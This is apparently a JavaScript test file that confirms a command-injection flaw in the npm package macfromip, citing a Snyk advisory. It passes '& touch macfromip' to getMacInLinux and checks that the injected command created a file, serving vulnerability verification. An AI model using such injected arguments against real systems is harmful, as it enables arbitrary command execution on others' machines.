//https://snyk.io/vuln/SNYK-JS-MACFROMIP-1048336
test("Command Injection in macfromip", () => 
{
    const a = require("macfromip");
	const fs = require('fs')
	const path = './macfromip'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    a.getMacInLinux("& touch macfromip", function(){});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
